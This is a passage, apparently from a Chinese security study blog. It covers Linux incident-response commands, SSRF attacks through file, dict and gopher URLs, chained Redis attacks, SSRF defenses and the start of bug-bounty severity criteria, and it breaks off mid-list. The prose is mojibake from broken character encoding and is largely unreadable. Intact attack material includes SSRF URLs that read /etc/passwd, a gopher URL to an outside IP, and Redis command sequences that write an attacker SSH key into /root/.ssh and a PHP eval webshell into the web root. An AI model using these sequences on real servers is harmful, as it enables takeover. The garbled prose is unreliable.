shellç™»å½•çš„ç”¨æˆ·ï¼š<code>cat /etc/passwd | grep /bin/bash</code></li></ul><ol start="2"><li>å†å²å‘½ä»¤</li></ol><ul><li>æŸ¥çœ‹å†å²å‘½ä»¤ï¼š<code>history</code></li><li>ä¿å­˜å†å²å‘½ä»¤åˆ°æ–‡ä»¶ï¼š<code>cat .bash_history &gt;&gt; history.txt</code></li></ul><ol start="3"><li>ç«¯å£</li></ol><ul><li>æŸ¥çœ‹ç«¯å£å¼€æ”¾å’Œè¿æ¥æƒ…å†µï¼š<code>netstat -pantu</code></li><li>æŸ¥çœ‹å¯ç–‘è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼ˆæ ¹æ®PIDï¼‰ï¼š<code>ls -l /proc/&lt;pid&gt;/exe</code></li></ul><ol start="4"><li>è¿›ç¨‹</li></ol><ul><li>æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ï¼š<code>ps -aux</code></li><li>æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹ï¼š<code>ps -aux | grep &lt;pid&gt;</code></li><li>æŸ¥çœ‹CPUå ç”¨ç‡å‰åçš„è¿›ç¨‹ï¼š<code>ps aux --sort=pcpu | head -10</code></li></ul><ol start="5"><li>è‡ªå¯é¡¹</li></ol><ul><li>æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹ï¼š<code>systemctl list-unit-files | grep enabled</code></li></ul><ol start="6"><li>å®šæ—¶ä»»åŠ¡</li></ol><ul><li>æŸ¥çœ‹å½“å‰ç”¨æˆ·å®šæ—¶ä»»åŠ¡ï¼š<code>crontab -l</code></li><li>æŸ¥çœ‹æŒ‡å®šç”¨æˆ·å®šæ—¶ä»»åŠ¡ï¼ˆå¦‚rootï¼‰ï¼š<code>crontab -u root -l</code></li></ul><ol start="7"><li>è¿›ç¨‹ç›‘æ§</li></ol><ul><li>åŠ¨æ€ç›‘æ§è¿›ç¨‹ï¼ˆæŒ‰CPUå ç”¨æ’åºï¼‰ï¼š<code>top</code></li><li>æŒ‰å†…å­˜ä½¿ç”¨æ’åºç›‘æ§ï¼š<code>top -b</code>ï¼ˆåœ¨topç•Œé¢æŒ‰<code>M</code>é”®ï¼‰</li><li>ç›‘æ§æŒ‡å®šè¿›ç¨‹ï¼š<code>top -p &lt;pid&gt;</code></li><li>é™æ€ç›‘æ§è¿›ç¨‹ï¼š<code>ps -ef</code></li></ul><ol start="8"><li>Hostæ–‡ä»¶</li></ol><ul><li>æŸ¥çœ‹Hostæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹ï¼š<code>cat /etc/hosts</code></li></ul><ol start="9"><li>ç™»å½•æ—¥å¿—</li></ol><ul><li>ç»Ÿè®¡çˆ†ç ´rootè´¦å·å¤±è´¥æ¬¡æ•°åŠIPï¼š<code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></li><li>æŸ¥çœ‹æˆåŠŸç™»å½•çš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š<code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></li></ul><ol start="10"><li>å‘½ä»¤çŠ¶æ€</li></ol><ul><li>æŸ¥çœ‹å‘½ä»¤æ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼ˆé˜²æ­¢è¢«æ›¿æ¢ï¼‰ï¼š<code>stat /bin/netstat</code></li></ul><h2 id="SSRF-æ¼æ´åŸç†ä¸åº”ç”¨"><a href="#SSRF-æ¼æ´åŸç†ä¸åº”ç”¨" class="headerlink" title="SSRF æ¼æ´åŸç†ä¸åº”ç”¨"></a>SSRF æ¼æ´åŸç†ä¸åº”ç”¨</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/114626708">https://blog.csdn.net/qq_44159028/article/details/114626708</a><br><a href="https://blog.csdn.net/qq_44159028/article/details/117034100">https://blog.csdn.net/qq_44159028/article/details/117034100</a><br><a href="https://xz.aliyun.com/news/195">https://xz.aliyun.com/news/195</a></p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œä½¿æœåŠ¡å™¨ç«¯ä½œä¸ºä»£ç†å‘èµ·è¯·æ±‚ï¼Œä»è€Œè®¿é—®å¤–ç½‘æ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿæˆ–æœåŠ¡ã€‚SSRF æ¼æ´çš„å½¢æˆåŸå› é€šå¸¸æ˜¯æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æœªå¯¹ç›®æ ‡åœ°å€è¿›è¡Œè¿‡æ»¤ä¸é™åˆ¶ã€‚</p><h3 id="SSRF-æ¼æ´ä¸­å¸¸ç”¨åè®®çš„åŠŸèƒ½å’Œä½œç”¨"><a href="#SSRF-æ¼æ´ä¸­å¸¸ç”¨åè®®çš„åŠŸèƒ½å’Œä½œç”¨" class="headerlink" title="SSRF æ¼æ´ä¸­å¸¸ç”¨åè®®çš„åŠŸèƒ½å’Œä½œç”¨"></a>SSRF æ¼æ´ä¸­å¸¸ç”¨åè®®çš„åŠŸèƒ½å’Œä½œç”¨</h3><h4 id="1-file-åè®®"><a href="#1-file-åè®®" class="headerlink" title="1. file åè®®"></a>1. file åè®®</h4><p><strong>åŠŸèƒ½</strong>ï¼š</p><ul><li><strong>è¯»å–æœ¬åœ°æ–‡ä»¶</strong>ï¼šåœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–æœåŠ¡å™¨æœ¬åœ°çš„ä»»æ„æ–‡ä»¶å†…å®¹ã€‚ä¾‹å¦‚ï¼Œè¯»å– Linux ç³»ç»Ÿä¸­çš„ <code>/etc/passwd</code> æ–‡ä»¶æˆ– Windows ç³»ç»Ÿä¸­çš„ <code>C:\Windows\System32\drivers\etc\hosts</code> æ–‡ä»¶ã€‚</li></ul><p><strong>ä½œç”¨</strong>ï¼š</p><ul><li><strong>ä¿¡æ¯æ³„éœ²</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯»å–æ•æ„Ÿæ–‡ä»¶è·å–æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯ã€ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ç­‰ã€‚</li><li><strong>è¿›ä¸€æ­¥æ¸—é€</strong>ï¼šè·å–çš„æ–‡ä»¶å†…å®¹å¯èƒ½åŒ…å«å…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€å¯†é’¥ç­‰ï¼Œæœ‰åŠ©äºè¿›ä¸€æ­¥æ¸—é€ç›®æ ‡ç³»ç»Ÿã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure><h4 id="2-dict-åè®®"><a href="#2-dict-åè®®" class="headerlink" title="2. dict åè®®"></a>2. dict åè®®</h4><p><strong>åŠŸèƒ½</strong>ï¼š</p><ul><li><strong>æ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯</strong>ï¼šé€šè¿‡ dict åè®®å¯ä»¥è·å–ç›®æ ‡æœåŠ¡å™¨ä¸Šå®‰è£…çš„è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li><strong>æŸ¥çœ‹ç«¯å£</strong>ï¼šå¯ä»¥ç”¨äºæ¢æµ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šç‰¹å®šç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</li><li><strong>æ“ä½œå†…ç½‘ Redis æœåŠ¡</strong>ï¼šå¯ä»¥åˆ©ç”¨ dict åè®®ä¸å†…ç½‘ä¸­çš„ Redis æœåŠ¡è¿›è¡Œäº¤äº’ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</li></ul><p><strong>ä½œç”¨</strong>ï¼š</p><ul><li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šè·å–ç›®æ ‡æœåŠ¡å™¨çš„è½¯ä»¶ç‰ˆæœ¬å’Œç«¯å£ä¿¡æ¯ï¼Œæœ‰åŠ©äºè¿›ä¸€æ­¥æ”»å‡»ã€‚</li><li><strong>å†…ç½‘æ¸—é€</strong>ï¼šé€šè¿‡ä¸å†…ç½‘ä¸­çš„ Redis æœåŠ¡äº¤äº’ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿›ä¸€æ­¥æ¸—é€å†…ç½‘ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure><h4 id="3-gopher-åè®®"><a href="#3-gopher-åè®®" class="headerlink" title="3. gopher åè®®"></a>3. gopher åè®®</h4><p><strong>åŠŸèƒ½</strong>ï¼š</p><ul><li><strong>æ”¯æŒå‘å‡º GETã€POST è¯·æ±‚</strong>ï¼šgopher åè®®æ”¯æŒå‘é€ GET å’Œ POST è¯·æ±‚ï¼Œå¯ä»¥å…ˆæˆªè·è¿™äº›è¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆ gopher åè®®çš„è¯·æ±‚ã€‚</li><li><strong>ä¸‡èƒ½åè®®</strong>ï¼šgopher åè®®æ˜¯ SSRF åˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®ä¹‹ä¸€ï¼Œå¯ä»¥ç”¨äºåå¼¹ Shellã€æ”»å‡»å†…ç½‘çš„ Redisã€FTP ç­‰æœåŠ¡ã€‚</li></ul><p><strong>ä½œç”¨</strong>ï¼š</p><ul><li><strong>çµæ´»æ”»å‡»</strong>ï¼šå¯ä»¥æ„é€ å¤æ‚çš„è¯·æ±‚ï¼Œå®ç°å¯¹ç›®æ ‡æœåŠ¡å™¨çš„å¤šç§æ”»å‡»ã€‚</li><li><strong>å†…ç½‘æ¸—é€</strong>ï¼šåˆ©ç”¨ gopher åè®®å¯ä»¥æ”»å‡»å†…ç½‘ä¸­çš„å„ç§æœåŠ¡ï¼Œå¦‚ Redisã€MySQL ç­‰ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h3><ol><li><strong>æ£€æŸ¥æœåŠ¡ç«¯åŠŸèƒ½</strong>ï¼šæŸ¥çœ‹æœåŠ¡ç«¯æ˜¯å¦å­˜åœ¨ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œå¦‚åŠ è½½å›¾ç‰‡ã€ä¸‹è½½æ–‡ä»¶ã€è¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚</li><li><strong>æ£€æµ‹å¸¸ç”¨å‡½æ•°ä½¿ç”¨</strong>ï¼šæ£€æŸ¥ä»£ç ä¸­æ˜¯å¦ä½¿ç”¨äº† <code>curl_exec()</code>ã€<code>file_get_contents()</code>ã€<code>fsockopen()</code> ç­‰å‡½æ•°ï¼Œä¸”æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚</li><li><strong>æµ‹è¯• URL å‚æ•°</strong>ï¼šé€šè¿‡ä¿®æ”¹ URL å‚æ•°ï¼Œå°è¯•è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼ˆå¦‚ <code>file:///etc/passwd</code>ï¼‰æˆ–å†…ç½‘åœ°å€ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”ã€‚</li></ol><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><ol><li><strong>è¯»å–æœ¬åœ°æ–‡ä»¶</strong><ul><li><strong>Windows</strong>ï¼šä½¿ç”¨ <code>file://C:\Windows\System32\drivers\etc\hosts</code> ç­‰è·¯å¾„è¯»å–ç³»ç»Ÿæ–‡ä»¶ã€‚</li><li><strong>Linux</strong>ï¼šä½¿ç”¨ <code>file:///etc/passwd</code> ç­‰è·¯å¾„è¯»å–ç³»ç»Ÿæ–‡ä»¶ã€‚</li></ul></li><li><strong>ç«¯å£æ‰«æ</strong><ul><li>ä½¿ç”¨ <code>dict://IPåœ°å€:ç«¯å£</code> æˆ– <code>http://IPåœ°å€:ç«¯å£</code> æ¢æµ‹å†…ç½‘ç«¯å£å¼€æ”¾æƒ…å†µï¼Œæ ¹æ®é¡µé¢å“åº”æ—¶é—´åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</li></ul></li><li><strong>å†…ç½‘ä¸»æœºæ¢æµ‹</strong><ul><li>é€šè¿‡è¯»å– <code>/etc/hosts</code>ã€<code>/proc/net/arp</code> ç­‰æ–‡ä»¶è·å–å†…ç½‘ç½‘æ®µï¼Œä½¿ç”¨è„šæœ¬å¯¹å†…ç½‘ IP è¿›è¡Œçˆ†ç ´ï¼Œæ¢æµ‹å­˜æ´»ä¸»æœºã€‚</li></ul></li><li><strong>æ”»å‡»å†…ç½‘æœåŠ¡</strong><ul><li>åˆ©ç”¨ SSRF æ¼æ´è®¿é—®å†…ç½‘çš„ Redisã€MySQL ç­‰æœåŠ¡ï¼Œè¿›ä¸€æ­¥æ¸—é€å†…ç½‘èµ„äº§ã€‚</li></ul></li></ol><h3 id="ä¸-Redis-çš„ç»“åˆåˆ©ç”¨"><a href="#ä¸-Redis-çš„ç»“åˆåˆ©ç”¨" class="headerlink" title="ä¸ Redis çš„ç»“åˆåˆ©ç”¨"></a>ä¸ Redis çš„ç»“åˆåˆ©ç”¨</h3><ol><li><strong>æ¢æµ‹ Redis æœåŠ¡</strong><ul><li>ä½¿ç”¨ SSRF æ¼æ´å‘ Redis é»˜è®¤ç«¯å£ 6379 å‘èµ·è¯·æ±‚ï¼Œå¦‚ <code>dict://127.0.0.1:6379</code>ï¼Œåˆ¤æ–­ Redis æœåŠ¡æ˜¯å¦å¼€æ”¾ã€‚</li></ul></li><li><strong>å†™å…¥ SSH å…¬é’¥</strong><ul><li>åœ¨æ”»å‡»æœºç”Ÿæˆ SSH å¯†é’¥å¯¹ï¼Œå°†å…¬é’¥å†…å®¹é€šè¿‡ Redis å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ <code>~/.ssh/authorized_keys</code>ï¼Œå®ç°æ— å¯†ç ç™»å½•ã€‚</li><li>Redis å‘½ä»¤ç¤ºä¾‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;å…¬é’¥å†…å®¹&#x27;</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å†™å…¥ Webshell</strong><ul><li>æ„é€  Redis å‘½ä»¤ï¼Œè®¾ç½® Webshell å†…å®¹å¹¶å°†å…¶å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ç½‘ç«™æ ¹ç›®å½•ï¼Œå¦‚ <code>/var/www/html</code>ã€‚</li><li>Redis å‘½ä»¤ç¤ºä¾‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åå¼¹ Shell</strong><ul><li>é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡æˆ–åˆ©ç”¨ Redis çš„æ•°æ®å¤‡ä»½åŠŸèƒ½å†™å…¥ Webshellï¼Œå®ç°åå¼¹ Shellã€‚</li></ul></li></ol><ul><li><strong>å¸¸è§çš„Redisææƒæ–¹æ¡ˆ</strong><ul><li><strong>æ–¹æ¡ˆä¸€ï¼šåˆ©ç”¨Rediså†™å…¥å…¬é’¥è¿›è¡ŒSSHç™»å½•ææƒ</strong><ul><li><strong>æ­¥éª¤</strong>ï¼š<ol><li>æ”»å‡»è€…è·å–åˆ°Redisçš„å†™æƒé™ï¼Œå°†ç”Ÿæˆçš„SSHå…¬é’¥å†™å…¥åˆ°ç›®æ ‡æœåŠ¡å™¨çš„<code>~/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­ã€‚</li><li>æ”»å‡»è€…ä½¿ç”¨å¯¹åº”çš„ç§é’¥é€šè¿‡SSHå®¢æˆ·ç«¯è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä»è€Œè·å¾—æœåŠ¡å™¨çš„shellæƒé™ï¼Œå®ç°ææƒã€‚</li></ol></li><li><strong>è¯´æ˜</strong>ï¼šæ­¤æ–¹æ¡ˆéœ€è¦RedisæœåŠ¡å…·æœ‰å†™å…¥ç›®æ ‡æ–‡ä»¶ç³»ç»Ÿçš„æƒé™ï¼Œå¹¶ä¸”ç›®æ ‡æœåŠ¡å™¨çš„SSHæœåŠ¡é…ç½®å…è®¸å…¬é’¥è®¤è¯ã€‚</li></ul></li><li><strong>æ–¹æ¡ˆäºŒï¼šåˆ©ç”¨Redisçš„æ¨¡å—åŠ è½½åŠŸèƒ½æ‰§è¡Œæ¶æ„ä»£ç </strong><ul><li><strong>æ­¥éª¤</strong>ï¼š<ol><li>æ”»å‡»è€…ç¼–å†™æ¶æ„çš„Redisæ¨¡å—ä»£ç ï¼Œè¯¥æ¨¡å—åœ¨åŠ è½½åå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç‰¹å®šçš„å‘½ä»¤æˆ–æ“ä½œã€‚</li><li>æ”»å‡»è€…é€šè¿‡Redisçš„<code>MODULE LOAD</code>å‘½ä»¤åŠ è½½è¯¥æ¶æ„æ¨¡å—ï¼Œè§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œä»è€Œè·å¾—æœåŠ¡å™¨çš„æ›´é«˜æƒé™æˆ–æ‰§è¡Œæƒé™æå‡çš„æ“ä½œã€‚</li></ol></li><li><strong>è¯´æ˜</strong>ï¼šæ­¤æ–¹æ¡ˆé€‚ç”¨äºRedisç‰ˆæœ¬æ”¯æŒæ¨¡å—åŠ è½½åŠŸèƒ½ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤ŸæˆåŠŸç¼–å†™å’ŒåŠ è½½å…·æœ‰ææƒèƒ½åŠ›çš„æ¨¡å—ã€‚</li></ul></li></ul></li></ul><h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ol><li><strong>é™åˆ¶åè®®</strong>ï¼šä»…å…è®¸ HTTP å’Œ HTTPS è¯·æ±‚ã€‚</li><li><strong>é™åˆ¶ IP</strong>ï¼šé¿å…åº”ç”¨è¢«ç”¨æ¥è·å–å†…ç½‘æ•°æ®ï¼Œæ”»å‡»å†…ç½‘ã€‚</li><li><strong>é™åˆ¶ç«¯å£</strong>ï¼šé™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºå¸¸ç”¨çš„ HTTP ç«¯å£ï¼Œå¦‚ 80ã€443ã€8080 ç­‰ã€‚</li><li><strong>è¿‡æ»¤è¿”å›ä¿¡æ¯</strong>ï¼šéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”ï¼Œé¿å…æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</li><li><strong>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯</strong>ï¼šé¿å…ç”¨æˆ·æ ¹æ®é”™è¯¯ä¿¡æ¯åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</li></ol><ul><li><p><strong>SSRFçš„åˆ©ç”¨</strong></p><ul><li>SSRFæ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…è¯±å¯¼æœåŠ¡å™¨ç«¯å‘èµ·HTTPè¯·æ±‚åˆ°æŒ‡å®šçš„URLï¼Œä»è€Œè®¿é—®åˆ°æœåŠ¡å™¨å†…éƒ¨ç½‘ç»œæˆ–å—ä¿¡ä»»çš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„URLï¼Œè®©æœåŠ¡å™¨è¯·æ±‚å†…éƒ¨çš„ç®¡ç†ç•Œé¢ã€æ•°æ®åº“ç­‰æœåŠ¡ï¼Œè¿›è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæœªæˆæƒçš„æ“ä½œã€‚</li><li>åˆ©ç”¨æ–¹å¼åŒ…æ‹¬ï¼šé€šè¿‡æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼ˆå¦‚æœªæ­£ç¡®éªŒè¯å’Œé™åˆ¶è¯·æ±‚çš„URLï¼‰å‘é€æ„é€ çš„è¯·æ±‚ï¼Œè®¿é—®åˆ°å†…éƒ¨çš„èµ„æºï¼›åˆ©ç”¨æœåŠ¡å™¨å¯¹æŸäº›æœåŠ¡çš„ä¿¡ä»»å…³ç³»ï¼Œè¿›è¡Œæƒé™æå‡æˆ–æ•°æ®æ³„éœ²ç­‰ã€‚</li></ul></li><li><p><strong>SSRFçš„é˜²æŠ¤æ‰‹æ®µ</strong></p><ul><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥çš„URLè¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿å…¶ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œè®¿é—®èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œé™åˆ¶åªèƒ½è®¿é—®ç‰¹å®šçš„åŸŸåæˆ–IPåœ°å€æ®µï¼Œè¿‡æ»¤æ‰æ•æ„Ÿçš„åè®®ï¼ˆå¦‚file:&#x2F;&#x2F;ã€dict:&#x2F;&#x2F;ç­‰ï¼‰ã€‚</li><li><strong>ç½‘ç»œéš”ç¦»</strong>ï¼šå°†å†…éƒ¨æœåŠ¡å’Œå¤–éƒ¨ç½‘ç»œè¿›è¡Œéš”ç¦»ï¼Œä½¿ç”¨é˜²ç«å¢™ç­‰è®¾å¤‡é™åˆ¶æœåŠ¡å™¨å¯¹å†…éƒ¨ç½‘ç»œçš„è®¿é—®ã€‚åªå…è®¸å¿…è¦çš„æœåŠ¡å’Œç«¯å£è¿›è¡Œé€šä¿¡ï¼Œé¿å…æœåŠ¡å™¨è¢«è¯±å¯¼è®¿é—®åˆ°å†…éƒ¨æ•æ„Ÿèµ„æºã€‚</li><li><strong>é™åˆ¶æœåŠ¡å™¨ç«¯è¯·æ±‚</strong>ï¼šåœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­ï¼Œé™åˆ¶å‘èµ·è¯·æ±‚çš„åŠŸèƒ½ï¼Œåªå…è®¸å¿…è¦çš„è¯·æ±‚æ“ä½œï¼Œå¹¶å¯¹è¯·æ±‚çš„ç›®æ ‡åœ°å€è¿›è¡Œç™½åå•é™åˆ¶ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„åº“å’Œæ¡†æ¶</strong>ï¼šé€‰æ‹©ç»è¿‡å®‰å…¨å®¡è®¡çš„HTTPå®¢æˆ·ç«¯åº“å’Œæ¡†æ¶ï¼Œé¿å…ä½¿ç”¨å­˜åœ¨å·²çŸ¥æ¼æ´æˆ–ä¸å®‰å…¨å®ç°çš„åº“ï¼Œä»¥é™ä½è¢«SSRFæ”»å‡»çš„é£é™©ã€‚</li><li><strong>å®šæœŸå®‰å…¨æµ‹è¯•</strong>ï¼šé€šè¿‡æ¸—é€æµ‹è¯•å’Œä»£ç å®¡è®¡ç­‰æ‰‹æ®µï¼Œå‘ç°å’Œä¿®å¤æ½œåœ¨çš„SSRFæ¼æ´ï¼ŒåŠæ—¶æ›´æ–°å’Œä¿®è¡¥ç³»ç»ŸåŠåº”ç”¨çš„å®‰å…¨æ¼æ´ã€‚</li></ul></li></ul><h2 id="ä½œä¸ºä¼—æµ‹è¿è¥äººå‘˜çš„é—®é¢˜"><a href="#ä½œä¸ºä¼—æµ‹è¿è¥äººå‘˜çš„é—®é¢˜" class="headerlink" title="ä½œä¸ºä¼—æµ‹è¿è¥äººå‘˜çš„é—®é¢˜"></a>ä½œä¸ºä¼—æµ‹è¿è¥äººå‘˜çš„é—®é¢˜</h2><h3 id="æ¼æ´ç­‰çº§è¯„åˆ¤æ ‡å‡†"><a href="#æ¼æ´ç­‰çº§è¯„åˆ¤æ ‡å‡†" class="headerlink" title="æ¼æ´ç­‰çº§è¯„åˆ¤æ ‡å‡†"></a>æ¼æ´ç­‰çº§è¯„åˆ¤æ ‡å‡†</h3><ol><li><p><strong>ä¸¥é‡æ¼æ´</strong>ï¼š</p><ul><li>å‘ç”Ÿåœ¨æ ¸å¿ƒç³»ç»Ÿä¸šåŠ¡ç³»ç»Ÿï¼Œå¯é€ æˆå¤§é¢ç§¯å½±å“ï¼Œè·å–å¤§é‡ä¸šåŠ¡ç³»ç»Ÿæ§åˆ¶æƒé™ï¼Œè·å–æ ¸å¿ƒç³»ç»Ÿç®¡ç†äººå‘˜æƒé™å¹¶ä¸”å¯æ§åˆ¶æ ¸å¿ƒç³»ç»Ÿã€‚</li><li>åŒ…æ‹¬ä½†ä¸é™äºæ§åˆ¶å†…ç½‘å¤šå°æœºå™¨ã€æ ¸å¿ƒåå°è¶…çº§ç®¡ç†å‘˜æƒé™è·å–ä¸”é€ æˆå¤§èŒƒå›´ä¼ä¸šæ ¸å¿ƒæ•°æ®æ³„éœ²ç­‰ã€‚</li></ul></li><li><p><strong>é«˜å±æ¼æ´</strong>ï¼š</p><ul><li>è·å¾—ç³»ç»Ÿçš„æƒé™ï¼ˆå¦‚getshellã€å‘½ä»¤æ‰§è¡Œç­‰ï¼‰ã€‚</li><li>ç³»ç»Ÿçš„SQLæ³¨å…¥ï¼ˆåå°æ¼æ´é™çº§ï¼Œæ‰“åŒ…æäº¤é…Œæƒ…æå‡ï¼‰ã€‚</li><li>æ•æ„Ÿä¿¡æ¯è¶Šæƒè®¿é—®ï¼ˆå¦‚ç»•è¿‡è®¤è¯ç›´æ¥è®¿é—®ç®¡ç†åå°è¿›è¡Œæ•æ„Ÿæ“ä½œã€é‡è¦åå°å¼±å¯†ç ã€è·å–å¤§é‡å†…ç½‘æ•æ„Ÿä¿¡æ¯çš„SSRFç­‰ï¼‰ã€‚</li><li>è¯»å–ä»»æ„æ–‡ä»¶ã€‚</li><li>æ¶‰åŠé‡‘é’±çš„äº¤æ˜“ã€ç»•è¿‡æ”¯ä»˜é€»è¾‘ï¼ˆéœ€æœ€ç»ˆåˆ©ç”¨æˆåŠŸï¼Œä¼˜æƒ åˆ¸ç›¸å…³é—®é¢˜é™¤å¤–ï¼‰ã€‚</li><li>ä¸¥é‡çš„é€»è¾‘è®¾è®¡ç¼ºé™·å’Œæµç¨‹ç¼ºé™·ï¼ˆå¦‚ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ã€æ‰¹é‡ä¿®æ”¹ä»»æ„è´¦å·å¯†ç æ¼æ´ã€æ¶‰åŠä¼ä¸šæ ¸å¿ƒä¸šåŠ¡çš„é€»è¾‘æ¼æ´ç­‰ï¼‰ã€‚</li><li>å¤§èŒƒå›´å½±å“ç”¨æˆ·çš„å…¶ä»–æ¼æ´ï¼ˆå¦‚é‡è¦é¡µé¢å¯è‡ªåŠ¨ä¼ æ’­çš„å­˜å‚¨å‹XSSã€å¯è·å–ç®¡ç†å‘˜è®¤è¯ä¿¡æ¯ä¸”æˆåŠŸåˆ©ç”¨çš„å­˜å‚¨å‹XSSç­‰ï¼‰ã€‚</li><li>å¤§é‡æºä»£ç æ³„éœ²ã€‚</li></ul></li><li><p><strong>ä¸­å±æ¼æ´</strong>ï¼š</p><ul><li>éœ€äº¤äº’æ–¹å¯å½±å“ç”¨æˆ·çš„æ¼æ´ï¼ˆå¦‚å­˜å‚¨å‹XSSã€æ¶‰åŠæ 